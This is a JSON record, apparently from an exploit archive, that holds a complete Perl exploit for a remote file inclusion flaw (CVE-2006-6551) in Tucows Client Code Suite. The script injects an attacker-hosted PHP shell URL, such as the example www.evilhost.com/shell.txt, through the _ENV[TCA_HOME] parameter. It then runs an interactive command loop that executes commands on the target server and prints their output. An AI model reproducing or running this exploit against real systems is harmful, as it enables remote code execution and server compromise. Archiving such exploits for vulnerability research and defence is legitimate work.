{
  "id": "2896",
  "title": "Tucows Client Code Suite (CSS) 1.2.1015 - Remote File Inclusion",
  "cve": "CVE-2006-6551",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n#Tucows Open Project --Remote File Inclusion Vulnerablity\r\n#Bug Found & Exploit [c]oded By Dr Max Virus\r\n#Download:http://developer.tucows.com/code/ccs/downloads/ccs-open-1.2.1015-2006-209-1337.zip\r\n\r\n\r\nuse LWP::UserAgent;\r\n\r\n$target=@ARGV[0];\r\n$shellsite=@ARGV[1];\r\n$cmdv=@ARGV[2];\r\n\r\nif($target!~/http:\\/\\// || $shellsite!~/http:\\/\\// || !$cmdv)\r\n{\r\n       usg()\r\n}\r\nheader();\r\n\r\n\r\nwhile()\r\n{\r\nprint \"[Shell] \\$\";\r\nwhile (<STDIN>)\r\n{\r\n       $cmd=$_;\r\n       chomp($cmd);\r\n\r\n$xpl = LWP::UserAgent->new() or die;\r\n$req =\r\nHTTP::Request->new(GET=>$target.'/libs/tucows/api/cartridges/crt_TUCOWS_domains/lib/domainutils.inc.php?_ENV[TCA_HOME]='.$shellsite='.?&'.$cmdv.'='.$cmd)or\r\ndie \"\\n\\n Failed to Connect, Try again!\\n\";\r\n$res = $xpl->request($req);\r\n$info = $res->content;\r\n$info =~ tr/[\\n]/[&#234;]/;\r\n\r\n\r\nif (!$cmd) {\r\nprint \"\\nEnter a Command\\n\\n\"; $info =\"\";\r\n}\r\n\r\n\r\nelsif ($info =~/failed to open stream: HTTP request failed!/ || $info =~/:\r\nCannot execute a blank command in <b>/)\r\n{\r\nprint \"\\nCould Not Connect to cmd Host or Invalid Command Variable\\n\";\r\nexit;\r\n}\r\n\r\n\r\nelsif ($info =~/^<br.\\/>.<b>Warning/) {\r\nprint \"\\nInvalid Command\\n\\n\";\r\n};\r\n\r\n\r\nif($info =~ /(.+)<br.\\/>.<b>Warning.(.+)<br.\\/>.<b>Warning/)\r\n{\r\n$final = $1;\r\n$final=~ tr/[&#234;]/[\\n]/;\r\nprint \"\\n$final\\n\";\r\nlast;\r\n}\r\n\r\nelse {\r\nprint \"[shell] \\$\";\r\n}\r\n}\r\n}\r\nlast;\r\n\r\n\r\n\r\nsub header()\r\n{\r\nprint q{\r\n*******************************************************************************\r\nTucows open Project  -- Remote Include Exploit\r\n\r\nVulnerablity found by: Dr Max Virus\r\n\r\nExploit [c]oded by: Dr Max Virus\r\n******************************************************************************\r\n}\r\n}\r\nsub usg()\r\n{\r\nheader();\r\nprint q{\r\nUsage: perl exploit.pl [tucows fullpath] [Shell Location] [Shell Cmd]\r\n[tucows FULL PATH] - Path to site exp. www.site.com\r\n[shell Location] - Path to shell exp. www.evilhost.com/shell.txt\r\n[shell Cmd Variable] - Command variable for php shell\r\nExample: perl exploit.pl http://www.site.com/[tucows]/\r\n********************************************************************************\r\n};\r\n\r\nexit();\r\n}\r\n\r\n# milw0rm.com [2006-12-08]",
  "url": "https://www.exploit-db.com/exploits/2896"
}